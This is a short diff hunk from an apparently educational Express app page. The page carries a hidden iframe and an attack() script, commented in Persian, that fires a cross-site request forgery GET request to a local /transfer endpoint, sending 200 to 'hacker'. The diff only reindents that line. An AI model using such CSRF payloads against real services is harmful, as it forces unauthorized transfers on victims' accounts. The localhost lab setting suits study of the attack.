@@ -31,7 +31,7 @@ app.get('/', (req, res) => {
             <iframe id="hiddenFrame" style="display:none"></iframe>
             
             <script>
-                    function attack() {
+                function attack() {
                     // حمله 1: GET روش Image برای transfer (اگر از GET پشتیبانی کند)
                     const img = new Image();
                     img.src = 'http://localhost:3000/transfer?to=hacker&amount=200';
